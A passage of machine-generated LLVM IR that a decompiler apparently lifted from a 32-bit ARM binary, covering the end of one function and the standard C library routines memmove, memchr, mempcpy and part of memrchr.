  store i32 %v11_178f8, i32* @lr, align 4
  %v2_17930 = add i32 %v0_17924, -4
  store i32 %v2_17930, i32* %r2.global-to-local, align 4
  %v4_17930 = add i32 %v0_17924, 2147483632
  %v5_17930 = and i32 %v2_17930, %v4_17930
  %v6_17930 = icmp slt i32 %v5_17930, 0
  store i1 %v6_17930, i1* %cpsr_v.global-to-local, align 1
  %v7_17930 = icmp slt i32 %v2_17930, 0
  store i1 %v7_17930, i1* %cpsr_n.global-to-local, align 1
  %v5_17934 = icmp slt i32 %v2_17924, -12
  br i1 %v5_17934, label %dec_label_pc_17950, label %dec_label_pc_17938

dec_label_pc_17938:                               ; preds = %dec_label_pc_1792c, %dec_label_pc_178ec, %dec_label_pc_17938
  %v1_17944 = phi i32 [ %v5_17944, %dec_label_pc_17938 ], [ %v1_17920, %dec_label_pc_1792c ], [ %v0_1784830, %dec_label_pc_178ec ]
  %v0_17938 = load i32, i32* %r3.global-to-local, align 4
  %v3_17938 = mul i32 %v0_17938, 16777216
  store i32 %v3_17938, i32* %ip.global-to-local, align 4
  %v0_1793c = load i32, i32* %r1.global-to-local, align 4
  %v1_1793c = add i32 %v0_1793c, -4
  %v2_1793c = inttoptr i32 %v1_1793c to i32*
  %v3_1793c = load i32, i32* %v2_1793c, align 4
  store i32 %v3_1793c, i32* %r3.global-to-local, align 4
  store i32 %v1_1793c, i32* %r1.global-to-local, align 4
  %v4_17940 = udiv i32 %v3_1793c, 256
  %v5_17940 = or i32 %v4_17940, %v3_17938
  store i32 %v5_17940, i32* @ip, align 4
  %v2_17944 = add i32 %v1_17944, -4
  %v3_17944 = inttoptr i32 %v2_17944 to i32*
  store i32 %v5_17940, i32* %v3_17944, align 4
  %v4_17944 = load i32, i32* %r0.global-to-local, align 4
  %v5_17944 = add i32 %v4_17944, -4
  store i32 %v5_17944, i32* %r0.global-to-local, align 4
  %v0_17948 = load i32, i32* %r2.global-to-local, align 4
  %v2_17948 = add i32 %v0_17948, -4
  store i32 %v2_17948, i32* %r2.global-to-local, align 4
  %v6_1794c = icmp slt i32 %v0_17948, 4
  br i1 %v6_1794c, label %dec_label_pc_17950.loopexit, label %dec_label_pc_17938

dec_label_pc_17950.loopexit:                      ; preds = %dec_label_pc_17938
  %v4_17948 = sub i32 3, %v0_17948
  %v5_17948 = and i32 %v4_17948, %v0_17948
  %v6_17948 = icmp slt i32 %v5_17948, 0
  %v7_17948 = icmp slt i32 %v2_17948, 0
  store i1 %v6_17948, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17948, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_17950

dec_label_pc_17950:                               ; preds = %dec_label_pc_17950.loopexit, %dec_label_pc_1792c
  %v2_177bc64 = phi i32 [ %v5_17944, %dec_label_pc_17950.loopexit ], [ %v1_17920, %dec_label_pc_1792c ]
  %v0_177ac60 = phi i32 [ %v2_17948, %dec_label_pc_17950.loopexit ], [ %v2_17930, %dec_label_pc_1792c ]
  %v0_17950 = load i32, i32* %r1.global-to-local, align 4
  %v1_17950 = add i32 %v0_17950, 1
  store i32 %v1_17950, i32* @r1, align 4
  br label %bb142

; uselistorder directives
  uselistorder i32 %v5_17944, { 0, 2, 1 }
  uselistorder i32 %v3_17938, { 1, 0 }
  uselistorder i32 %v2_17930, { 0, 2, 1, 3 }
  uselistorder i32 %v1_17920, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_17900, { 1, 0 }
  uselistorder i32 %v3_178fc, { 1, 0 }
  uselistorder i32 %v0_17900, { 3, 2, 1, 0 }
  uselistorder i32 %v0_17920, { 3, 2, 1, 0 }
  uselistorder i32 %v5_178d8, { 0, 2, 1 }
  uselistorder i32 %v3_178cc, { 1, 0 }
  uselistorder i32 %v2_178c4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_178b4, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_17894, { 1, 0 }
  uselistorder i32 %v3_17890, { 1, 0 }
  uselistorder i32 %v0_17894, { 3, 2, 1, 0 }
  uselistorder i32 %v0_178b4, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1786c, { 0, 2, 1 }
  uselistorder i32 %v3_17860, { 1, 0 }
  uselistorder i32 %v2_17858, { 0, 2, 1, 3 }
  uselistorder i32 %v1_17848, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_17828, { 1, 0 }
  uselistorder i32 %v3_17824, { 1, 0 }
  uselistorder i32 %v0_17828, { 3, 2, 1, 0 }
  uselistorder i32 %v0_17848, { 3, 2, 1, 0 }
  uselistorder i1 %v5_178f0, { 2, 0, 1 }
  uselistorder i32 %v0_17808, { 1, 0 }
  uselistorder i32 %v0_178f4, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1784830, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_177f8, { 2, 1, 0 }
  uselistorder i32 %v0_177f8, { 2, 0, 1 }
  uselistorder i32 %v2_177f0, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_177f0, { 1, 0, 2 }
  uselistorder i32 %v0_177f0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1784831, { 2, 1, 0 }
  uselistorder i32 %v11_177cc, { 1, 0 }
  uselistorder i32 %v7_177cc, { 1, 0 }
  uselistorder i32 %v1_177ac, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_177ac, { 1, 2, 0, 3 }
  uselistorder i32 %v2_177b0, { 1, 0 }
  uselistorder i32 %v7_177a4, { 0, 2, 1 }
  uselistorder i32 %v10_177a0, { 1, 0 }
  uselistorder i32 %v9_17798, { 1, 0, 2 }
  uselistorder i32 %v6_17794, { 1, 0 }
  uselistorder i32 %v2_1778c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1778c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1779c, { 0, 3, 2, 1 }
  uselistorder i32 %v7_17780, { 0, 2, 1 }
  uselistorder i32 %v13_1777c, { 1, 0 }
  uselistorder i32 %v4_17778, { 0, 2, 1, 3 }
  uselistorder i32 %v0_17778, { 2, 0, 1 }
  uselistorder i32 %v6_17780, { 0, 3, 2, 1 }
  uselistorder i32 %v7_17770, { 0, 2, 1 }
  uselistorder i32 %v16_1776c, { 1, 0 }
  uselistorder i32 %v4_17768, { 1, 0 }
  uselistorder i32 %v0_17778.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_17770, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_1775c, { 0, 3, 2, 1 }
  uselistorder i32 %v10_17758, { 1, 0 }
  uselistorder i32 %v1_17754, { 1, 0 }
  uselistorder i32 %v10_17750, { 1, 0 }
  uselistorder i32 %v0_17750, { 3, 2, 1, 0 }
  uselistorder i32 %v0_17754, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_17748, { 0, 2, 1 }
  uselistorder i32 %v2_1773c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1773c, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v0_1775448, { 1, 2, 0 }
  uselistorder i32 %v1_17734, { 2, 1, 0 }
  uselistorder i32 %v1_1772c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_17724, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_17720, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_1771c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_1771c, { 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %v4_17708, { 0, 2, 1 }
  uselistorder i32 %v3_176fc, { 1, 0 }
  uselistorder i32 %v2_176f4, { 0, 2, 1, 3 }
  uselistorder i32 %v12_176e4, { 1, 0, 3, 2 }
  uselistorder i32 %v8_176c4, { 1, 0, 2 }
  uselistorder i32 %v5_176c4, { 1, 0, 2 }
  uselistorder i32 %v2_176c4, { 1, 0, 2 }
  uselistorder i32 %v3_176c0, { 1, 0 }
  uselistorder i32 %v0_176c4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_176e4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_1769c, { 0, 2, 1 }
  uselistorder i32 %v3_17690, { 1, 0 }
  uselistorder i32 %v2_17688, { 0, 2, 1, 3 }
  uselistorder i32 %v12_17678, { 1, 0, 3, 2 }
  uselistorder i32 %v8_17658, { 1, 0, 2 }
  uselistorder i32 %v5_17658, { 1, 0, 2 }
  uselistorder i32 %v2_17658, { 1, 0, 2 }
  uselistorder i32 %v3_17654, { 1, 0 }
  uselistorder i32 %v0_17658, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_17678, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_17630, { 0, 2, 1 }
  uselistorder i32 %v3_17624, { 1, 0 }
  uselistorder i32 %v2_1761c, { 0, 2, 1, 3 }
  uselistorder i32 %v12_1760c, { 1, 0, 3, 2 }
  uselistorder i32 %v8_175ec, { 1, 0, 2 }
  uselistorder i32 %v5_175ec, { 1, 0, 2 }
  uselistorder i32 %v2_175ec, { 1, 0, 2 }
  uselistorder i32 %v3_175e8, { 1, 0 }
  uselistorder i32 %v0_175ec, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1760c, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_176b4, { 2, 0, 1 }
  uselistorder i32 %v0_176b8, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1760c74, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_175bc, { 1, 0 }
  uselistorder i32 %v0_175bc, { 3, 1, 0, 2 }
  uselistorder i32 %v2_175b4, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_175b4, { 1, 0, 2 }
  uselistorder i32 %v0_175b4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1760c75, { 2, 1, 0 }
  uselistorder i32 %v1_17594, { 1, 0, 2 }
  uselistorder i32 %v1_1756c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_1756c, { 1, 2, 0, 3 }
  uselistorder i32 %v8_17558, { 1, 0, 2 }
  uselistorder i32 %v6_17554, { 1, 0 }
  uselistorder i32 %v2_1754c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1754c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1755c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_17544, { 0, 2, 1 }
  uselistorder i1 %v0_17544, { 1, 0 }
  uselistorder i1 %v1_17544, { 1, 0 }
  uselistorder i32 %v3_17540, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_17538, { 0, 2, 1, 3 }
  uselistorder i32 %v4_17524, { 1, 0 }
  uselistorder i32 %v12_17518, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1750c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_17510, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_17500, { 0, 2, 1 }
  uselistorder i32 %v2_174f8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_174f8, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v1_174f0, { 1, 0 }
  uselistorder i32 %v1_174e8, { 2, 1, 0 }
  uselistorder i32 %v2_174e0, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_174e0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_174d0, { 1, 0 }
  uselistorder i32 %v1_174d0, { 1, 5, 3, 4, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_174d0, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 15, 16, 17, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 24, 25, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r3.global-to-local, { 0, 9, 1, 2, 3, 10, 4, 5, 6, 11, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 39, 40, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 0, 30, 1, 2, 3, 4, 5, 31, 6, 7, 8, 9, 10, 32, 11, 12, 13, 14, 15, 33, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 34, 64, 65, 66, 67, 68, 69, 35, 60, 36, 37, 38, 39, 40, 61, 41, 42, 43, 44, 45, 62, 46, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 63 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 12, 1, 3, 6, 4, 13, 5, 7, 10, 8, 14, 9, 11, 15, 16, 17, 33, 32, 34, 35, 36, 19, 18, 26, 20, 21, 24, 22, 27, 23, 25, 28, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 3, 25, 4, 5, 26, 6, 7, 27, 8, 9, 10, 11, 12, 13, 28, 14, 16, 15, 17, 18, 29, 19, 20, 30, 21, 22, 23, 24, 31, 57, 59, 60, 32, 39, 33, 34, 40, 35, 36, 37, 38, 41, 42, 0, 43, 44, 46, 45, 47, 48, 58, 49, 50, 51, 54, 52, 53, 55, 56, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 0, 41, 1, 24, 2, 25, 42, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 0, 47, 1, 27, 2, 28, 48, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 27, { 1, 0, 2 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17938, { 2, 0, 1 }
  uselistorder label %dec_label_pc_178cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17860, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17800, { 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb142, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_1778c, { 1, 0 }
  uselistorder label %.thread15, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %dec_label_pc_17750, { 1, 0 }
  uselistorder label %dec_label_pc_1773c, { 1, 0 }
  uselistorder label %dec_label_pc_176fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17690, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17624, { 2, 0, 1 }
  uselistorder label %dec_label_pc_175c4, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %.thread119, { 1, 0 }
  uselistorder label %bb132, { 4, 6, 5, 1, 7, 0, 2, 3 }
  uselistorder label %.thread117, { 1, 0 }
  uselistorder label %dec_label_pc_17538, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_174f8, { 1, 0 }
}

define i32 @function_17958(i32 %arg1) local_unnamed_addr {
dec_label_pc_17958:
  ret i32 %arg1
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_17960 = load i32, i32* @r0, align 4
  %v1_17960 = load i32, i32* @r1, align 4
  %v2_17960 = inttoptr i32 %v0_17960 to i8*
  %v3_17960 = call i32 @_memcpy(i8* %v2_17960, i32 %v1_17960)
  ret i32 %v3_17960

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 0, 2, 1 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_17970 = load i32, i32* @r4, align 4
  %v6_17970 = load i32, i32* @r5, align 4
  %v9_17970 = load i32, i32* @r6, align 4
  %v1_17974 = urem i32 %arg1, 256
  %v0_1799018 = load i32, i32* @r2, align 4
  %v2_1799020 = icmp eq i32 %v0_1799018, 0
  br i1 %v2_1799020, label %dec_label_pc_179a0, label %dec_label_pc_17998

dec_label_pc_1797c:                               ; preds = %dec_label_pc_17998
  %v3_1797c = load i8, i8* %.021, align 1
  %v4_1797c = zext i8 %v3_1797c to i32
  %v9_17980 = icmp eq i32 %v4_1797c, %v1_17974
  %v1_17984 = add i32 %v0_17984, -1
  br i1 %v9_17980, label %bb, label %dec_label_pc_17990

bb:                                               ; preds = %dec_label_pc_1797c
  ret i32 %v1_17998

dec_label_pc_17990:                               ; preds = %dec_label_pc_1797c
  %v2_1798c = add i32 %v1_17998, 1
  %v3_1798c = inttoptr i32 %v2_1798c to i8*
  %v2_17990 = icmp eq i32 %v1_17984, 0
  br i1 %v2_17990, label %dec_label_pc_179a0, label %dec_label_pc_17998

dec_label_pc_17998:                               ; preds = %entry, %dec_label_pc_17990
  %v0_17984 = phi i32 [ %v1_17984, %dec_label_pc_17990 ], [ %v0_1799018, %entry ]
  %.021 = phi i8* [ %v3_1798c, %dec_label_pc_17990 ], [ undef, %entry ]
  %v1_17998 = ptrtoint i8* %.021 to i32
  %v2_17998 = urem i32 %v1_17998, 4
  %v3_17998 = icmp eq i32 %v2_17998, 0
  br i1 %v3_17998, label %dec_label_pc_179a0, label %dec_label_pc_1797c

dec_label_pc_179a0:                               ; preds = %dec_label_pc_17990, %dec_label_pc_17998, %entry
  %v0_17a2c37 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_17990 ], [ %v0_17984, %dec_label_pc_17998 ]
  %.0.lcssa = phi i8* [ undef, %entry ], [ %v3_1798c, %dec_label_pc_17990 ], [ %.021, %dec_label_pc_17998 ]
  %v4_179a0 = mul nuw nsw i32 %v1_17974, 256
  %v5_179a0 = or i32 %v4_179a0, %v1_17974
  %v1_179a4 = ptrtoint i8* %.0.lcssa to i32
  %v4_179a8 = mul i32 %v5_179a0, 65536
  %v5_179a8 = or i32 %v4_179a8, %v5_179a0
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_17a2c37, 3
  br i1 %tmp, label %dec_label_pc_179b0, label %dec_label_pc_17a54.preheader

dec_label_pc_179b0:                               ; preds = %dec_label_pc_179a0, %dec_label_pc_17a2c.backedge
  %v0_179cc82 = phi i32 [ %v1_179cc, %dec_label_pc_17a2c.backedge ], [ %v0_17a2c37, %dec_label_pc_179a0 ]
  %v0_179b081 = phi i32 [ %v4_179b0, %dec_label_pc_17a2c.backedge ], [ %v1_179a4, %dec_label_pc_179a0 ]
  %v1_179b0 = inttoptr i32 %v0_179b081 to i32*
  %v2_179b0 = load i32, i32* %v1_179b0, align 4
  %v4_179b0 = add i32 %v0_179b081, 4
  %v2_179b4 = xor i32 %v2_179b0, %v5_179a8
  %v2_179b8 = add i32 %v2_179b4, 2130640639
  %v1_179bc = sub i32 -1, %v2_179b4
  %v2_179c0 = xor i32 %v2_179b8, %v1_179bc
  %v2_179c4 = and i32 %v2_179c0, -2130640640
  %v2_179c8 = icmp eq i32 %v2_179c4, 0
  %v1_179cc = add i32 %v0_179cc82, -4
  br i1 %v2_179c8, label %dec_label_pc_17a2c.backedge, label %dec_label_pc_179d4

dec_label_pc_17a2c.backedge:                      ; preds = %dec_label_pc_179b0, %dec_label_pc_17a18
  store i32 -2130640640, i32* @lr, align 4
  %tmp107 = icmp ugt i32 %v1_179cc, 3
  br i1 %tmp107, label %dec_label_pc_179b0, label %dec_label_pc_17a54.preheader

dec_label_pc_179d4:                               ; preds = %dec_label_pc_179b0
  %v2_179d4 = inttoptr i32 %v0_179b081 to i8*
  %v3_179d4 = load i8, i8* %v2_179d4, align 1
  %v4_179d4 = zext i8 %v3_179d4 to i32
  %v9_179dc = icmp eq i32 %v4_179d4, %v1_17974
  %v1_179e0 = add i32 %v0_179b081, 3
  %v1_179e4 = add i32 %v0_179b081, 1
  store i32 %v1_179e4, i32* @lr, align 4
  %v1_179e8 = add i32 %v0_179b081, 2
  br i1 %v9_179dc, label %bb50, label %bb51

bb50:                                             ; preds = %dec_label_pc_179d4
  store i32 %v3_17970, i32* @r4, align 4
  store i32 %v6_17970, i32* @r5, align 4
  store i32 %v9_17970, i32* @r6, align 4
  ret i32 %v0_179b081

bb51:                                             ; preds = %dec_label_pc_179d4
  %v2_179f0 = inttoptr i32 %v1_179e4 to i8*
  %v3_179f0 = load i8, i8* %v2_179f0, align 1
  %v4_179f0 = zext i8 %v3_179f0 to i32
  %v9_179f4 = icmp eq i32 %v4_179f0, %v1_17974
  br i1 %v9_179f4, label %dec_label_pc_179fc, label %dec_label_pc_17a04

dec_label_pc_179fc:                               ; preds = %bb51
  store i32 %v3_17970, i32* @r4, align 4
  store i32 %v6_17970, i32* @r5, align 4
  store i32 %v9_17970, i32* @r6, align 4
  ret i32 %v1_179e4

dec_label_pc_17a04:                               ; preds = %bb51
  %v2_17a04 = inttoptr i32 %v1_179e8 to i8*
  %v3_17a04 = load i8, i8* %v2_17a04, align 1
  %v4_17a04 = zext i8 %v3_17a04 to i32
  %v9_17a08 = icmp eq i32 %v4_17a04, %v1_17974
  br i1 %v9_17a08, label %dec_label_pc_17a10, label %dec_label_pc_17a18

dec_label_pc_17a10:                               ; preds = %dec_label_pc_17a04
  store i32 %v3_17970, i32* @r4, align 4
  store i32 %v6_17970, i32* @r5, align 4
  store i32 %v9_17970, i32* @r6, align 4
  ret i32 %v1_179e8

dec_label_pc_17a18:                               ; preds = %dec_label_pc_17a04
  %v2_17a18 = inttoptr i32 %v1_179e0 to i8*
  %v3_17a18 = load i8, i8* %v2_17a18, align 1
  %v4_17a18 = zext i8 %v3_17a18 to i32
  %v9_17a1c = icmp eq i32 %v4_17a18, %v1_17974
  br i1 %v9_17a1c, label %dec_label_pc_17a24, label %dec_label_pc_17a2c.backedge

dec_label_pc_17a24:                               ; preds = %dec_label_pc_17a18
  store i32 %v3_17970, i32* @r4, align 4
  store i32 %v6_17970, i32* @r5, align 4
  store i32 %v9_17970, i32* @r6, align 4
  ret i32 %v1_179e0

dec_label_pc_17a54.preheader:                     ; preds = %dec_label_pc_17a2c.backedge, %dec_label_pc_179a0
  %v0_179b0.lcssa = phi i32 [ %v1_179a4, %dec_label_pc_179a0 ], [ %v4_179b0, %dec_label_pc_17a2c.backedge ]
  %v0_179cc.lcssa = phi i32 [ %v0_17a2c37, %dec_label_pc_179a0 ], [ %v1_179cc, %dec_label_pc_17a2c.backedge ]
  %v2_17a5411 = icmp eq i32 %v0_179cc.lcssa, 0
  br i1 %v2_17a5411, label %dec_label_pc_17a5c, label %dec_label_pc_17a44

dec_label_pc_17a44:                               ; preds = %dec_label_pc_17a54, %dec_label_pc_17a54.preheader
  %v0_17a54.in = phi i32 [ %v0_17a54, %dec_label_pc_17a54 ], [ %v0_179cc.lcssa, %dec_label_pc_17a54.preheader ]
  %v15_17a4c = phi i32 [ %v1_17a50, %dec_label_pc_17a54 ], [ %v0_179b0.lcssa, %dec_label_pc_17a54.preheader ]
  %v0_17a54 = add i32 %v0_17a54.in, -1
  %v1_17a44 = inttoptr i32 %v15_17a4c to i8*
  %v2_17a44 = load i8, i8* %v1_17a44, align 1
  %v3_17a44 = zext i8 %v2_17a44 to i32
  %v9_17a48 = icmp eq i32 %v3_17a44, %v1_17974
  br i1 %v9_17a48, label %bb52, label %dec_label_pc_17a54

bb52:                                             ; preds = %dec_label_pc_17a44
  store i32 %v3_17970, i32* @r4, align 4
  store i32 %v6_17970, i32* @r5, align 4
  store i32 %v9_17970, i32* @r6, align 4
  ret i32 %v15_17a4c

dec_label_pc_17a54:                               ; preds = %dec_label_pc_17a44
  %v1_17a50 = add i32 %v15_17a4c, 1
  %v2_17a54 = icmp eq i32 %v0_17a54, 0
  br i1 %v2_17a54, label %dec_label_pc_17a5c, label %dec_label_pc_17a44

dec_label_pc_17a5c:                               ; preds = %dec_label_pc_17a54, %dec_label_pc_17a54.preheader
  store i32 %v3_17970, i32* @r4, align 4
  store i32 %v6_17970, i32* @r5, align 4
  store i32 %v9_17970, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v15_17a4c, { 1, 0, 2 }
  uselistorder i32 %v1_179cc, { 1, 0, 2 }
  uselistorder i32 %v0_179b081, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_179a0, { 1, 0 }
  uselistorder i32 %v0_17a2c37, { 1, 2, 0 }
  uselistorder i32 %v1_17974, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_17970, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17a2c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_179b0, { 1, 0 }
  uselistorder label %dec_label_pc_179a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17998, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_17a78 = call i32 @memcpy()
  %v0_17a7c = load i32, i32* @r5, align 4
  %v1_17a7c = load i32, i32* @r4, align 4
  %v2_17a7c = add i32 %v1_17a7c, %v0_17a7c
  ret i32 %v2_17a7c
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_17a84 = load i32, i32* @r4, align 4
  %v1_17a88 = urem i32 %arg2, 256
  %v2_17a8c = add i32 %arg3, %arg1
  %v2_17aa42 = icmp eq i32 %arg3, 0
  br i1 %v2_17aa42, label %dec_label_pc_17ab4, label %dec_label_pc_17aac

dec_label_pc_17a94:                               ; preds = %dec_label_pc_17aac
  %v1_17a94 = add i32 %v0_17a94, -1
  %v2_17a94 = inttoptr i32 %v1_17a94 to i8*
  %v3_17a94 = load i8, i8* %v2_17a94, align 1
  %v4_17a94 = zext i8 %v3_17a94 to i32
  %v9_17a98 = icmp eq i32 %v4_17a94, %v1_17a88
  br i1 %v9_17a98, label %bb, label %dec_label_pc_17aa4

bb:                                               ; preds = %dec_label_pc_17a94
  ret i32 %v1_17a94

dec_label_pc_17aa4:                               ; preds = %dec_label_pc_17a94
  %v1_17aa0 = add i32 %v0_17aa0, -1
  %v2_17aa4 = icmp eq i32 %v1_17aa0, 0
  br i1 %v2_17aa4, label %dec_label_pc_17ab4, label %dec_label_pc_17aac

dec_label_pc_17aac:                               ; preds = %entry, %dec_label_pc_17aa4
  %v0_17aa0 = phi i32 [ %v1_17aa0, %dec_label_pc_17aa4 ], [ %arg3, %entry ]
  %v0_17a94 = phi i32 [ %v1_17a94, %dec_label_pc_17aa4 ], [ %v2_17a8c, %entry ]
  %v1_17aac = urem i32 %v0_17a94, 4
  %v2_17aac = icmp eq i32 %v1_17aac, 0
  br i1 %v2_17aac, label %dec_label_pc_17ab4, label %dec_label_pc_17a94

dec_label_pc_17ab4:                               ; preds = %dec_label_pc_17aa4, %dec_label_pc_17aac, %entry
  %v0_17b4c11 = phi i32 [ %v2_17a8c, %entry ], [ %v1_17a94, %dec_label_pc_17aa4 ], [ %v0_17a94, %dec_label_pc_17aac ]
  %v0_17b387 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_17aa4 ], [ %v0_17aa0, %dec_label_pc_17aac ]
  %v4_17ab4 = mul nuw nsw i32 %v1_17a88, 256
  %v5_17ab4 = or i32 %v4_17ab4, %v1_17a88
  %v4_17ab8 = mul i32 %v5_17ab4, 65536
  %v5_17ab8 = or i32 %v4_17ab8, %v5_17ab4
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_17b387, 3
  br i1 %tmp, label %dec_label_pc_17ac0, label %dec_label_pc_17b48

dec_label_pc_17ac0:                               ; preds = %dec_label_pc_17ab4, %.backedge.backedge
  %v0_17adc51 = phi i32 [ %v1_17adc, %.backedge.backedge ], [ %v0_17b387, %dec_label_pc_17ab4 ]
  %v0_17ac050 = phi i32 [ %v1_17ac0, %.backedge.backedge ], [ %v0_17b4c11, %dec_label_pc_17ab4 ]
  %v1_17ac0 = add i32 %v0_17ac050, -4
  %v2_17ac0 = inttoptr i32 %v1_17ac0 to i32*
  %v3_17ac0 = load i32, i32* %v2_17ac0, align 4
  %v2_17ac4 = xor i32 %v3_17ac0, %v5_17ab8
  %v2_17ac8 = add i32 %v2_17ac4, 2130640639
  %v1_17acc = sub i32 -1, %v2_17ac4
  %v2_17ad0 = xor i32 %v2_17ac8, %v1_17acc
  %v2_17ad4 = and i32 %v2_17ad0, -2130640640
  %v2_17ad8 = icmp eq i32 %v2_17ad4, 0
  %v1_17adc = add i32 %v0_17adc51, -4
  br i1 %v2_17ad8, label %.backedge.backedge, label %dec_label_pc_17ae4

dec_label_pc_17ae4:                               ; preds = %dec_label_pc_17ac0
